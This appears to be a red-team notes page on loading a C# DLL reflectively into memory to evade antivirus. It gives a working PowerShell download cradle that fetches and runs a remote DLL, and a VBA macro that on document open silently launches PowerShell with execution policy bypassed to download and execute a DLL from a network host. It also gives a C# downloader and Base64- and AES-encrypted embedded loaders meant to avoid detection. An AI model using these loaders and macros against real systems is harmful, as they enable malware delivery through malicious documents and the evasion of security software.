
C# templates for various techniques such as process injection and process hollowing can be built within a DLL using Visual Studio. The DLL can then be reflectively loaded with PowerShell and executed in memory. This is a highly preferable way to execute code due to AV engines having a difficult time analysing the files.


```csharp
using System;
using System.Diagnostics;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {
        // Ensure the main method is public static void
        // Enusre methods in the embedded c# code are public and accessible
        // Ensure correct 'using' statments required within the shellcode runners are inserted at the top
        public static void Main()
        {
          // Main code logic goes here
        }
    }
}
```

After compiling, use the following PowerShell code to execute by invoking the DLL from a URL

```powershell
$webClient = New-Object System.Net.WebClient
$data = $webClient.DownloadData('http://127.0.0.1:7711/ClassLibrary1.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("Main")
$method.Invoke([NullString]::Value, @())
$webClient.Dispose()
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()
```

We can even execute directly from a Macro
```vba
' Possibly doesnt work when Applocker / CLM is enabled

Sub Document_Open()
    RunPowerShell
End Sub

Sub AutoOpen()
    RunPowerShell
End Sub

Sub RunPowerShell()
    Dim psCommand As String

    psCommand = "powershell -ExecutionPolicy Bypass -Command " & _
                Chr(34) & _
                "$webClient = New-Object System.Net.WebClient; " & _
                "$data = $webClient.DownloadData('http://192.168.45.187:7711/ClassLibrary2.dll'); " & _
                "$assem = [System.Reflection.Assembly]::Load($data); " & _
                "$class = $assem.GetType('ClassLibrary2.Class2'); " & _
                "$method = $class.GetMethod('Main'); " & _
                "$method.Invoke($null, @()); " & _
                "$webClient.Dispose(); " & _
                "[System.GC]::Collect(); [System.GC]::WaitForPendingFinalizers();" & Chr(34)

    Shell psCommand, vbHide

    '  Wait for some time to ensure the script has time to execute
    Wait 5
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```
Or compile the follwing cs file to invoke through a binary
```csharp
using System.Net;
using System.Reflection;

namespace RunDLL
{
    class Program
    {
        static void Main(string[] args)
        {

            WebClient client = new WebClient();
            var Data = client.DownloadData("http://192.168.1.144:7711/ClassLibrary1.dll");

            var Assem = Assembly.Load(Data);
            var loadedClass = Assem.GetType("ClassLibrary1.Class1");
            var loadedMethod = loadedClass.GetMethod("Main");

            loadedMethod.Invoke(null, null);
            client.Dispose();
            System.GC.Collect();
            System.GC.WaitForPendingFinalizers();


        }
    }
}
```

Additionally, revoke the need for invoking from URL and store the DLL as a Base64 data blob, decode within the script and load reflectivley 
```powershell
$base64Data = "BASE64_ENCODED_DLL_DATA"
$data = [System.Convert]::FromBase64String($base64Data)
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("Main")
$method.Invoke([NullString]::Value, @())
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()
```
An even better method for loading without invoking from URL would be to store the DLL as an encrypted byte array within the script, decrypt and load into memory
```powershell
Function DecryptAES {
    param ($encryptedBuf, $Key, $IV)
    
    $AES = [Security.Cryptography.SymmetricAlgorithm]::Create('AES')
    $AES.Key = $Key
    $AES.IV = $IV

    $decryptor = $AES.CreateDecryptor()
    $memoryStream = New-Object -TypeName IO.MemoryStream -ArgumentList (,$encryptedBuf)
    $cryptoStream = New-Object -TypeName Security.Cryptography.CryptoStream -ArgumentList @( $memoryStream, $decryptor, 'Read' )
    
    $decryptedBytes = New-Object -TypeName Byte[] -ArgumentList $encryptedBuf.Length
    $decryptedByteCount = $cryptoStream.Read($decryptedBytes, 0, $decryptedBytes.Length)
    
    $cryptoStream.Close()
    $memoryStream.Close()
    
    return $decryptedBytes[0..($decryptedByteCount - 1)]
}

$base64Data = "BASE64_ENCODED_DLL_DATA"
$encryptedData = [System.Convert]::FromBase64String($base64Data)

$Key = [System.Convert]::FromBase64String("BASE64_AES_KEY")
$IV = [System.Convert]::FromBase64String("BASE64_AES_IV")
$decryptedData = DecryptAES -encryptedBuf $encryptedData -Key $Key -IV $IV

$assem = [System.Reflection.Assembly]::Load($decryptedData)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("Main")
$method.Invoke([NullString]::Value, @())

[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()
```
